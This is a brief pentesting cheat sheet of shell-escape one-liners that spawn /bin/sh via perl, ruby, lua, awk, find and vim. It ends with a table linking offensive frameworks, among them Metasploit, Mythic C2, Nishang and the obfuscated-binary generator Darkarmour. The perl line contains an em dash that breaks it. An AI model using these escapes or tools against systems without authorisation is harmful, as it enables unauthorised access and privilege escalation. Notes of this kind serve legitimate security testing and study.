
perl
```
perl —e 'exec "/bin/sh";'

```

ruby
```
ruby: exec "/bin/sh"

```

LUA
```
lua: os.execute('/bin/sh')

```


using awk command to spawn a shell
```
awk 'BEGIN {system("/bin/sh")}'

```

using Find to execute a shell
```
find / -name nameoffile -exec /bin/awk 'BEGIN {system("/bin/sh")}' \;

```

```
find . -exec /bin/sh \; -quit

```

VIM to shell
```
vim -c ':!/bin/sh'

```

VIM escape
```
vim
:set shell=/bin/sh
:shell
```

Resource	Description
[MSFVenom & Metasploit-Framework](https://github.com/rapid7/metasploit-framework)	Source MSF is an extremely versatile tool for any pentester's toolkit. It serves as a way to enumerate hosts, generate payloads, utilize public and custom exploits, and perform post-exploitation actions once on the host. Think of it as a swiss-army knife.

[Payloads All The Things](https://github.com/swisskyrepo/PayloadsAllTheThings)	Source Here, you can find many different resources and cheat sheets for payload generation and general methodology.

[Mythic C2 Framework](https://github.com/its-a-feature/Mythic)	Source The Mythic C2 framework is an alternative option to Metasploit as a Command and Control Framework and toolbox for unique payload generation.

[Nishang](https://github.com/samratashok/nishang)	Source Nishang is a framework collection of Offensive PowerShell implants and scripts. It includes many utilities that can be useful to any pentester.

[Darkarmour](https://github.com/bats3c/darkarmour)	Source Darkarmour is a tool to generate and utilize obfuscated binaries for use against Windows hosts.